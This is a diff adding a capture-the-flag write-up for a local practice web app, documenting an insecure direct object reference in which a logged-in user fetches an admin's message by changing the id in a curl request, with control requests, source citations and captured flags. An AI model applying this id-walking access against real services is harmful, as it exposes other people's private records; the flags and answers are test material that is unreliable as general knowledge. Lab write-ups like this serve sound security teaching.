@@ -9,7 +9,15 @@ All testing was against `http://127.0.0.1:5000`, the local instance of the
 practice target, started with `FLAG_SEED=s_hart`. Nothing outside this app was
 touched.
 
-Status: 1 of 6 captured (sqli). The other five are not yet worked.
+A note on the em dash rule, since a reader grepping this file will find them.
+Where an em dash appears inside a quoted response block it is the target's own
+output, copied byte for byte. The app's templates render message titles as
+`#<id> — <title>` (`messages.html:6`, `message_detail.html:5`), so any faithful
+capture of those pages contains one. Those are evidence, and altering them would
+make the record inaccurate, so they are preserved as received. No em dash
+appears in the prose of this file.
+
+Status: 2 of 6 captured (sqli, idor). The other four are not yet worked.
 
 ---
 
@@ -206,3 +214,182 @@ FLAG{sqli_0883918f1b72}  VALID (sqli)
 
 No entry was made in `attempts.md`, because the challenge was captured on the
 first attempt and the stopping rule applies only after three failures.
+
+---
+
+## 2. idor: missing ownership check at `GET /messages/<int:msg_id>`
+
+**Flag:** `FLAG{idor_c143bbc0c939}`
+**Captured:** 2026-09-29
+**Verified:** `verify.py` exit 1 with `2/6 valid` and the line
+`FLAG{idor_c143bbc0c939}  VALID (idor)`. Exit 1 is expected while four
+challenges remain.
+
+### The vulnerability
+
+`message_detail()` looks the message up by id and nothing else
+(`app.py:265` to `app.py:267`). It fetches the `owner` column, so the information
+needed for an ownership check is right there in the row, but the function never
+compares it against the caller. The only two tests in the handler are whether a
+user is logged in (`app.py:261`) and whether a row came back (`app.py:268`).
+
+The list route at `app.py:253` to `app.py:255` does the opposite: it filters
+`WHERE owner = ?` with the caller's username. So the app knows how to scope
+messages to their owner, and applies that scoping on one route while omitting it
+on the other. The list page then hands the user the ids they are allowed to see
+(`messages.html:6`), which is what makes the id trivial to guess and increment.
+
+This is the IDOR precisely stated: the object identifier is user-supplied and
+the authorization decision that should accompany it is absent. It is not a
+missing authentication bug, and the controls below demonstrate that difference.
+
+### Step 1: establish a genuine session
+
+The session used is a normal login with the handout credentials, not a forged
+cookie. Literal request:
+
+```
+curl -s -i -c alice.txt -X POST http://127.0.0.1:5000/login \
+  --data-urlencode "username=alice" \
+  --data-urlencode "password=password123"
+```
+
+Response headers:
+
+```
+HTTP/1.1 302 FOUND
+Location: /dashboard
+Set-Cookie: auth=YWxpY2U6dXNlcg==; Path=/
+```
+
+`YWxpY2U6dXNlcg==` decodes to `alice:user`. The cookie was issued by the app
+itself through its own `set_auth` (`app.py:182` to `app.py:184`) in response to
+real credentials, so nothing about the following requests depends on forging or
+tampering with it.
+
+### Step 2: the list shows only alice's messages
+
+Literal request:
+
+```
+curl -s -b alice.txt http://127.0.0.1:5000/messages
+```
+
+Literal response, body region:
+
+```
+<h1>Your messages</h1>
+<ul>
+
+    <li><a href="/messages/4">#4 — Grocery list</a></li>
+
+    <li><a href="/messages/5">#5 — Vacation</a></li>
+
+</ul>
+```
+
+Ids 4 and 5 are the two rows seeded with `owner = 'alice'` (`app.py:151` to
+`app.py:152`). Id 1 does not appear, which establishes that the app considers it
+not alice's.
+
+### Step 3: alice's own message, the authorized case
+
+Literal request:
+
+```
+curl -s -o m5.html -w "http_code=%{http_code}\n" -b alice.txt \
+  http://127.0.0.1:5000/messages/5
+```
+
+Literal response, `http_code=200`:
+
+```
+  <h1>#5 — Vacation</h1>
+  <p class="meta">To: alice</p>
+  <p>Out of office next Monday.</p>
+```
+
+### Step 4: admin's message, the same request shape with a different id
+
+Literal request, identical except for the id:
+
+```
+curl -s -o m1.html -w "http_code=%{http_code}\n" -b alice.txt \
+  http://127.0.0.1:5000/messages/1
+```
+
+Literal response, `http_code=200`:
+
+```
+  <h1>#1 — Onboarding secret</h1>
+  <p class="meta">To: admin</p>
+  <p>Internal only. Do not share. FLAG{idor_c143bbc0c939}</p>
+```
+
+This is the evidence. The `To: admin` line is rendered from `row.owner`
+(`message_detail.html:6`), so the page itself states that the record belongs to
+admin while it is being served to a session the app knows is alice.
+
+### The contrast, side by side
+
+| Request | Session | HTTP | Record served | Rendered owner |
+|---|---|---|---|---|
+| `GET /messages` | alice | 200 | ids 4 and 5 only | alice |
+| `GET /messages/5` | alice | 200 | id 5 | `To: alice` |
+| `GET /messages/1` | alice | 200 | id 1 | `To: admin` |
+
+The first row and the third row are the contradiction. The list route refuses to
+show id 1 to alice, and the detail route serves it to her on request.
+
+### Controls run alongside the exploit
+
+| Request | Result | What it rules out |
+|---|---|---|
+| `GET /messages/99` as alice | `404` | the route does distinguish a missing record, so the `200` on id 1 means the record exists and was deliberately served, not that the route returns `200` for anything |
+| `GET /messages/1` with no cookie | `302` to `/login` | the route is not unauthenticated; a session is genuinely required, so the defect is the missing ownership check specifically, not the absence of any access control |
+
+The second control is the one that separates this from an authn bug. With a
+valid alice session the request succeeds; with no session it is redirected. The
+session is doing its job. What is missing is the second question, "is this row
+alice's", which `app.py:265` to `app.py:270` never asks.
+
+### Why the id is guessable
+
+The seeded ids are contiguous and start at 1 (`app.py:144` to `app.py:154`), and
+the list route prints each owned id into the link href (`messages.html:6`), so
+alice sees `#4` and `#5` and can simply walk downwards. The `<int:msg_id>`
+converter (`app.py:259`) accepts any non-negative integer, so the endpoint
+serves the whole id space.
+
+### Reproduction notes
+
+- The flag is in `messages.body` for id 1, owned by admin (`app.py:148` to
+  `app.py:149`), described in the source as the IDOR reward.
+- The SQL here is parameterized (`app.py:265` to `app.py:267`), so this is not an
+  injection. The id is bound as a value, which is why the fix is an
+  authorization check and not an escaping change. Worth stating plainly in the
+  report, because the two bugs sit on adjacent lines and look similar.
+- Restarting the app rebuilds the database and restores the seeded rows
+  (`app.py:407`, `app.py:105` to `app.py:107`); the flag is stable across
+  restarts because it derives from `FLAG_SEED` (`app.py:62` to `app.py:67`).
+
+### Result
+
+Appended to `submission.txt`:
+
+```
+FLAG{idor_c143bbc0c939}
+```
+
+Verifier output:
+
+```
+verify: 2/6 valid. Still missing: xss, authz, traversal, exposure
+FLAG{sqli_0883918f1b72}  VALID (sqli)
+FLAG{idor_c143bbc0c939}  VALID (idor)
+
+2/6 flags valid for username s_hart
+```
+
+No entry was made in `attempts.md`: the challenge was captured on the first
+attempt.
